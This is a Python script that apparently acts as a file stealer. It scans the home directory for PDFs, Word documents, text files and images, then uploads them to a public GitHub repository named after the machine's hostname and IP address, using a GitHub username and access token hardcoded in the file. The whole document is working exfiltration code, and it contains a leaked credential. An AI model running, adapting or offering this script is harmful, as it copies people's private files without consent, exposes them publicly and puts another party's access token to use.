import os
import socket
import base64
from datetime import datetime
import requests
import time
import platform

# ---------------- CONFIG ----------------
GITHUB_USERNAME = "kailesh-waran-13"
GITHUB_TOKEN = "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"
BRANCH = "main"
FILE_TYPES = {
    "PDFs": ['.pdf'],
    "DOCX": ['.docx'],
    "TEXT": ['.txt'],
    "Images": ['.png', '.jpg', '.jpeg']
}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
MAX_FILES_PER_PART = 1000
RETRY_DELAY = 5  # seconds
MAX_RETRIES = 3  # retry attempts for failures

# ---------------- SYSTEM INFO ----------------
hostname = socket.gethostname()
try:
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "UnknownIP"
safe_ip = ip_address.replace(".", "_")

# Repo name includes hostname, IP, device type
repo_name = f"{hostname}_{safe_ip}_Windows"

# ---------------- HELPER FUNCTIONS ----------------
def create_repo_if_not_exists(token, repo_name):
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{repo_name}"
    resp = requests.get(url, auth=(GITHUB_USERNAME, token))
    if resp.status_code == 404:
        url_create = "https://api.github.com/user/repos"
        data = {"name": repo_name, "private": False, "auto_init": True}
        headers = {"Authorization": f"token {token}"}
        resp_create = requests.post(url_create, json=data, headers=headers)
        if resp_create.status_code == 201:
            print(f"[+] Repository '{repo_name}' created successfully!")
        else:
            print(f"[!] Failed to create repo '{repo_name}': {resp_create.status_code} | {resp_create.json()}")
    else:
        print(f"[INFO] Using existing repository: {repo_name}")

def get_existing_files(username, token, repo, folder=""):
    url = f"https://api.github.com/repos/{username}/{repo}/contents/{folder}" if folder else f"https://api.github.com/repos/{username}/{repo}/contents"
    resp = requests.get(url, auth=(username, token))
    existing = set()
    if resp.status_code == 200:
        for item in resp.json():
            if item["type"] == "file":
                existing.add(item["name"])
    return existing

def upload_file(username, token, repo, branch, folder, filepath, existing_files):
    filename = os.path.basename(filepath)

    if filename in existing_files:
        print(f"[SKIP] {filename} already exists")
        return "Skipped (already present)"

    if os.path.getsize(filepath) > MAX_FILE_SIZE:
        print(f"[SKIP] {filename} too large (>100MB)")
        return "Skipped (too large)"

    with open(filepath, "rb") as f:
        content = base64.b64encode(f.read()).decode()

    url = f"https://api.github.com/repos/{username}/{repo}/contents/{folder}/{filename}"
    data = {"message": f"Add {filename}", "content": content, "branch": branch}

    for attempt in range(1, MAX_RETRIES + 1):
        resp = requests.put(url, json=data, auth=(username, token))
        if resp.status_code in [200, 201]:
            print(f"[UPLOAD] {filename}")
            return "Uploaded"
        else:
            print(f"[FAIL] {filename} | Attempt {attempt} failed | Status: {resp.status_code}")
            if attempt < MAX_RETRIES:
                time.sleep(RETRY_DELAY)
            else:
                return f"Failed ({resp.status_code})"

def scan_files():
    files_dict = {key: [] for key in FILE_TYPES}
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            file_lower = file.lower()
            filepath = os.path.join(root, file)
            for folder_name, exts in FILE_TYPES.items():
                if any(file_lower.endswith(ext) for ext in exts):
                    files_dict[folder_name].append(filepath)
    return files_dict

# ---------------- MAIN ----------------
def main():
    create_repo_if_not_exists(GITHUB_TOKEN, repo_name)
    files_to_upload = scan_files()

    for category, file_list in files_to_upload.items():
        existing_files = get_existing_files(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, category)
        part_num = 1
        files_uploaded_in_part = 0

        for fpath in file_list:
            if files_uploaded_in_part >= MAX_FILES_PER_PART:
                part_num += 1
                files_uploaded_in_part = 0

            folder = f"{category}/Part{part_num}"
            status = upload_file(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, BRANCH, folder, fpath, existing_files)

            if status == "Uploaded":
                existing_files.add(os.path.basename(fpath))
                files_uploaded_in_part += 1

    print("[INFO] All files processed successfully.")

if __name__ == "__main__":
    main()
